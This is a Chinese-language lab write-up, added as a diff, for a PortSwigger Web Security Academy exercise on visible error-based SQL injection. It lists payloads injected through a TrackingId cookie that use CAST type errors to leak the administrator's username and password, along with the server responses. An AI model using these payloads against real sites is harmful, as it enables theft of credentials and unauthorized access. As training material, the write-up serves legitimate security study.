@@ -1,0 +1,28 @@
+### 通过详细SQL错误信息提取敏感数据 ###
+https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based
+# CAST 将字符串转为数字引发错误。在字符串长度限制下构建最短查询 #
+注入点 Cookie: TrackingId=vK3SVT5C9Y5INWGU
+
+输入
+'
+得到
+Unterminated string literal started at position 52 in SQL 
+SELECT * FROM tracking WHERE id = 'vK3SVT5C9Y5INWGU''. Expected char
+
+输入
+' AND 1=CAST((SELECT 1 FROM user) AS int) --
+得到
+Unterminated string literal started at position 95 in SQL 
+SELECT * FROM tracking WHERE id = 'vK3SVT5C9Y5INWGU' AND 1=CAST((SELECT 1 FROM user AND ROWNUM '. Expected  char
+@@ 输入被截断，删除原始cookie的值以容纳更多输入 @@
+删除后此查询得到200响应
+
+@@ 此处非甲骨文数据库，使用LIMIT @@
+' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+得到
+ERROR: invalid input syntax for type integer: "administrator"
+
+@@ 第一项即为管理员数据 @@
+输入
+' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+得到密码
